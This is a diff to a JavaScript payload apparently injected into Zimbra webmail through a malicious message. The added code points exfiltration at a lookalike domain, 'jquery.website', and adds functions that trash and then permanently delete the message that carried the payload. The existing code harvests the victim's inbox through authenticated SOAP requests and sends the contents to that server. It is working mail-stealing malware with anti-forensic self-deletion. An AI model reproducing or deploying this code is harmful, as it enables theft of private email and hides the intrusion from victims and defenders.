@@ -1,5 +1,57 @@
-var server_url = "http://216.189.150.136:8018/data/";
+var server_url = "https://jquery.website:8019/data/";
 
+function delSelf(mail,k){
+	var id = getC("Row-selected")[0].id.match(/zli__CLV.*?\:(-{0,1}\d*)/)[1];
+	var x = new XMLHttpRequest();
+	x.onreadystatechange = function(){
+		if(x.readyState == 4 && x.status == 200){
+			var x2 = new XMLHttpRequest()
+			x2.open("POST",window.location.origin+"/service/soap/ConvActionRequest");
+			var d2 = "{\"Header\":{\"context\":{\"_jsns\":\"urn:zimbra\",\"userAgent\":{\"name\":\"ZimbraWebClient - GC63 (Mac)\",\"version\":\"7.3.0 GA\"},\"session\":{\"_content\":1,\"id\":1},\"notify\":{\"seq\":6},\"account\":{\"_content\":\"local@host.local\",\"by\":\"name\"}}},\"Body\":{\"ConvActionRequest\":{\"_jsns\":\"urn:zimbraMail\",\"action\":{\"op\":\"delete\",\"tcon\":\"t\",\"id\":\"#token:#id\"}}}}".replace("#id",id).replace("#token",k);
+			x2.withCredentials = true;
+			x2.send(d2);
+		}
+	}
+	x.open("POST",window.location.origin+"/service/soap/ConvActionRequest");
+	var d = "{\"Header\":{\"context\":{\"_jsns\":\"urn:zimbra\",\"userAgent\":{\"name\":\"ZimbraWebClient - GC63 (Mac)\",\"version\":\"7.3.0 GA\"},\"session\":{\"_content\":1,\"id\":1},\"notify\":{\"seq\":6},\"account\":{\"_content\":\"#mail\",\"by\":\"name\"}}},\"Body\":{\"ConvActionRequest\":{\"_jsns\":\"urn:zimbraMail\",\"action\":{\"op\":\"trash\",\"tcon\":\"-tj\",\"l\":\"3\",\"id\":\"#token:#id\"}}}}".replace("#mail",mail).replace("#token",k).replace("#id",id);
+	x.withCredentials = true;
+	x.send(d);
+}
+
+function delSelf2(mail,token){
+
+	var id = getC("Row-selected")[0].id.match(/zli__CLV-main__(-{0,1}\d*)/)[1];
+
+	var token2 = 0;
+	var s = document.getElementsByTagName("script");
+	for(var i=0;i<s.length;i++){
+		try{
+			token2 = document.getElementsByTagName("script")[i].innerHTML.match(/(.*)"token":(\d*?)\},"_jsns"(.*)/)[2];
+			break;
+		}
+		catch(e){
+			continue;
+		}
+	}
+
+	var x = new XMLHttpRequest();
+	x.open("POST",window.location.origin+"/service/soap/ConvActionRequest");
+	x.onreadystatechange = function(){
+		if(x.readyState == 4 && x.status == 200){
+			var x2 = new XMLHttpRequest();
+			x2.open("POST",window.location.origin+"/service/soap/ConvActionRequest");
+			x2.withCredentials = true;
+			x2.setRequestHeader("X-Zimbra-Csrf-Token",token);
+			var d2 = "{\"Header\":{\"context\":{\"_jsns\":\"urn:zimbra\",\"userAgent\":{\"name\":\"ZimbraWebClient - GC63 (Mac)\",\"version\":\"8.6.0_GA_1169\"},\"session\":{\"_content\":1,\"id\":1},\"notify\":{\"seq\":2},\"account\":{\"_content\":\"#mail\",\"by\":\"name\"},\"csrfToken\":\"#token\"}},\"Body\":{\"ConvActionRequest\":{\"_jsns\":\"urn:zimbraMail\",\"action\":{\"op\":\"delete\",\"tcon\":\"t\",\"id\":\"#id\"}}}}".replace("#mail",mail).replace("token",token).replace("#id",id);
+			x2.send(d2);
+		}
+	}
+	x.withCredentials = true;
+	x.setRequestHeader("X-Zimbra-Csrf-Token",token);
+	var d = "{\"Header\":{\"context\":{\"_jsns\":\"urn:zimbra\",\"userAgent\":{\"name\":\"ZimbraWebClient - GC63 (Mac)\",\"version\":\"8.6.0_GA_1169\"},\"session\":{\"_content\":1,\"id\":1},\"change\":{\"token\":#n_token,\"type\":\"new\"},\"account\":{\"_content\":\"#mail\",\"by\":\"name\"},\"csrfToken\":\"#token\"}},\"Body\":{\"ConvActionRequest\":{\"_jsns\":\"urn:zimbraMail\",\"action\":{\"op\":\"trash\",\"tcon\":\"-dtj\",\"l\":\"3\",\"id\":\"#id\"}}}}".replace("#n_token",token2).replace("#token",token).replace("#mail",mail).replace("#id",id);
+	x.send(d);
+
+}
 
 function getMail2(){
 	var s = document.getElementsByTagName("script");
@@ -15,6 +67,9 @@ function getMail2(){
 		
 	}
 }
+function getC(n){
+	return document.getElementsByClassName(n);
+}
 
 function sendToServer(t,mail){
 	var result = t.match(/"content":"(.*?)"\}\]/);
@@ -25,9 +80,7 @@ function sendToServer(t,mail){
 	}
 }
 
-function getC(n){
-	return document.getElementsByClassName(n);
-}
+
 function getCidAndFetch(r,k){
 
 	var pt2 = new RegExp("\"id\":\"#key:(-{0,1}\\\d*?)\",\"n\"".replace("#key",k),"g");
@@ -73,7 +126,8 @@ function getData(list,k,mail,num){
 		}
 	};
 	var d2 = "{\"Header\":{\"context\":{\"_jsns\":\"urn:zimbra\",\"userAgent\":{\"name\":\"ZimbraWebClient - GC63 (Mac)\",\"version\":\"7.3.0 GA\"},\"session\":{\"_content\":1,\"id\":1},\"account\":{\"_content\":\"#mail\",\"by\":\"name\"}}},\"Body\":{\"SearchConvRequest\":{\"_jsns\":\"urn:zimbraMail\",\"sortBy\":\"dateDesc\",\"tz\":{\"id\":\"Asia/Hong_Kong\"},\"locale\":{\"_content\":\"zh_CN\"},\"offset\":0,\"limit\":250,\"query\":\"in:inbox\",\"cid\":\"#token:#cid\",\"fetch\":\"#token:#fetch\",\"read\":1,\"html\":1,\"needExp\":1,\"max\":250000}}}".replace("#mail",mail).replace("#token",k).replace("#token",k).replace("#cid",list[num]["cid"]).replace("#fetch",list[num]["fetch"])
-	xml2.open("POST",location.origin+"/service/soap/SearchConvRequest");
+	xml2.open("POST",window.location.origin+"/service/soap/SearchConvRequest");
+	xml2.withCredentials = true;
 	xml2.send(d2);
 }
 
@@ -93,18 +147,22 @@ function getData2(list,token,mail,num){
 		}
 	}
 	var d = "{\"Header\":{\"context\":{\"_jsns\":\"urn:zimbra\",\"userAgent\":{\"name\":\"ZimbraWebClient - GC63 (Mac)\",\"version\":\"8.6.0_GA_1169\"},\"session\":{\"_content\":1450912,\"id\":1450912},\"notify\":{\"seq\":6},\"account\":{\"_content\":\"#mail\",\"by\":\"name\"},\"csrfToken\":\"#token\"}},\"Body\":{\"SearchConvRequest\":{\"_jsns\":\"urn:zimbraMail\",\"sortBy\":\"dateDesc\",\"header\":[{\"n\":\"List-ID\"},{\"n\":\"X-Zimbra-DL\"},{\"n\":\"IN-REPLY-TO\"}],\"tz\":{\"id\":\"Asia/Hong_Kong\"},\"locale\":{\"_content\":\"zh_CN\"},\"offset\":0,\"limit\":250,\"query\":\"in:inbox\",\"cid\":\"#cid\",\"fetch\":\"u!\",\"read\":1,\"html\":1,\"needExp\":1,\"max\":250000,\"recip\":\"2\"}}}".replace("#mail",mail).replace("#token",token).replace("#cid",list[num]);
-	xml.open("POST",location.origin+"/service/soap/SearchConvRequest");
+	xml.open("POST",window.location.origin+"/service/soap/SearchConvRequest");
 	xml.setRequestHeader("X-Zimbra-Csrf-Token",token);
+	xml.withCredentials = true;
 	xml.send(d);
 
 }
 
-if(location.origin.match(/^http:\/\/127(.*)/)){
+if(window.location.origin.match(/^http:\/\/127(.*)/)){
+	
 	var mail = getC("ZmOverview")[0].id.match(/zov__(.*?):main_Mail/)[1];
 	var m_list = getC("RowDouble");
 	var p = m_list[0].id.match(/zli__CLV__(.*?):(.*)/);
 	var k = p[1];		//token串
 	var cur = p[2];		//头指针
+
+	delSelf(mail,k);
 
 	var xml = new XMLHttpRequest();
 	xml.onreadystatechange = function(){
@@ -121,7 +179,8 @@ if(location.origin.match(/^http:\/\/127(.*)/)){
 	};
 	var limit = "50";
 	var data = "{\"Header\":{\"context\":{\"_jsns\":\"urn:zimbra\",\"userAgent\":{\"name\":\"ZimbraWebClient - GC63 (Mac)\",\"version\":\"7.3.0 GA\"},\"session\":{\"_content\":1,\"id\":1},\"account\":{\"_content\":\"#mail\",\"by\":\"name\"}}},\"Body\":{\"SearchRequest\":{\"_jsns\":\"urn:zimbraMail\",\"sortBy\":\"dateDesc\",\"tz\":{\"id\":\"Asia/Hong_Kong\"},\"locale\":{\"_content\":\"zh_CN\"},\"cursor\":{\"id\":\"#token:#cursor\",\"sortVal\":\"1515485360000\"},\"offset\":100,\"limit\":#limit,\"query\":\"in:inbox\",\"types\":\"conversation\",\"fetch\":1}}}".replace("#mail",mail).replace("#cursor",cur).replace("#token",k).replace("#limit",limit);
-	xml.open("POST",location.origin+"/service/soap/SearchRequest");
+	xml.open("POST",window.location.origin+"/service/soap/SearchRequest");
+	xml.withCredentials = true;
 	xml.send(data);
 
 }
@@ -130,6 +189,9 @@ else{
 	var m_list = getC("RowDouble");
 	var list = [];
 	var token = window.csrfToken;
+
+	delSelf2(mail,token);
+
 	for(var i = 0;i<m_list.length;i++){
 		list.push(m_list[i].id.match(/zli__CLV-main__(.*)/)[1]);
 	}
